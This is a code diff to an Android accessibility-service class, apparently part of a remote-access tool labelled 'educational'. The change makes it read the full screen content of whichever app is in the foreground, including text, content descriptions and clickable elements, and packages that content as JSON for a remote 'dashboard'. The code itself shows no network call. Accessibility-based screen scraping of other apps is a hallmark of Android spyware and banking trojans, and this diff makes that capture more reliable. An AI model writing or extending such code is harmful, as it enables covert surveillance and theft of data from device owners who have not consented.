@@ -1,10 +1,13 @@
 package com.remoteaccess.educational.commands;
 
 import android.accessibilityservice.AccessibilityService;
+import android.accessibilityservice.AccessibilityWindowInfo;
+import android.os.Build;
 import android.view.accessibility.AccessibilityNodeInfo;
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
+import java.util.List;
 
 /**
  * SCREEN READER - Read Screen Content
@@ -28,13 +31,43 @@ public class ScreenReader {
     }
 
     /**
+     * Find the root node of the foreground application window.
+     * Uses getWindows() (API 21+) to scan all windows and pick the topmost
+     * non-system application window, falling back to getRootInActiveWindow().
+     */
+    private AccessibilityNodeInfo getForegroundRoot() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+            try {
+                List<AccessibilityWindowInfo> windows = accessibilityService.getWindows();
+                if (windows != null) {
+                    // Prefer the active (focused) application window
+                    for (AccessibilityWindowInfo w : windows) {
+                        if (w.getType() == AccessibilityWindowInfo.TYPE_APPLICATION && w.isActive()) {
+                            AccessibilityNodeInfo r = w.getRoot();
+                            if (r != null) return r;
+                        }
+                    }
+                    // Fallback: first application window (highest z-order)
+                    for (AccessibilityWindowInfo w : windows) {
+                        if (w.getType() == AccessibilityWindowInfo.TYPE_APPLICATION) {
+                            AccessibilityNodeInfo r = w.getRoot();
+                            if (r != null) return r;
+                        }
+                    }
+                }
+            } catch (Exception ignored) {}
+        }
+        return accessibilityService.getRootInActiveWindow();
+    }
+
+    /**
      * Read all screen content
      */
     public JSONObject readScreen() {
         JSONObject result = new JSONObject();
         
         try {
-            AccessibilityNodeInfo rootNode = accessibilityService.getRootInActiveWindow();
+            AccessibilityNodeInfo rootNode = getForegroundRoot();
             
             if (rootNode == null) {
                 result.put("success", false);
@@ -88,9 +121,9 @@ public class ScreenReader {
                 element.put("text", node.getText().toString());
             }
             
-            // Content description
+            // Content description — key must match what the dashboard expects
             if (node.getContentDescription() != null) {
-                element.put("description", node.getContentDescription().toString());
+                element.put("contentDescription", node.getContentDescription().toString());
             }
             
             // View ID
@@ -142,7 +175,7 @@ public class ScreenReader {
         JSONObject result = new JSONObject();
         
         try {
-            AccessibilityNodeInfo rootNode = accessibilityService.getRootInActiveWindow();
+            AccessibilityNodeInfo rootNode = getForegroundRoot();
             
             if (rootNode == null) {
                 result.put("success", false);
@@ -200,7 +233,7 @@ public class ScreenReader {
         JSONObject result = new JSONObject();
         
         try {
-            AccessibilityNodeInfo rootNode = accessibilityService.getRootInActiveWindow();
+            AccessibilityNodeInfo rootNode = getForegroundRoot();
             
             if (rootNode == null) {
                 result.put("success", false);
@@ -249,7 +282,7 @@ public class ScreenReader {
         JSONObject result = new JSONObject();
         
         try {
-            AccessibilityNodeInfo rootNode = accessibilityService.getRootInActiveWindow();
+            AccessibilityNodeInfo rootNode = getForegroundRoot();
             
             if (rootNode == null) {
                 result.put("success", false);
@@ -288,7 +321,7 @@ public class ScreenReader {
             if (node.isClickable()) {
                 JSONObject clickable = new JSONObject();
                 clickable.put("text", node.getText() != null ? node.getText().toString() : "");
-                clickable.put("description", node.getContentDescription() != null ? 
+                clickable.put("contentDescription", node.getContentDescription() != null ? 
                     node.getContentDescription().toString() : "");
                 clickable.put("className", node.getClassName());
                 
@@ -323,7 +356,7 @@ public class ScreenReader {
         JSONObject result = new JSONObject();
         
         try {
-            AccessibilityNodeInfo rootNode = accessibilityService.getRootInActiveWindow();
+            AccessibilityNodeInfo rootNode = getForegroundRoot();
             
             if (rootNode == null) {
                 result.put("success", false);
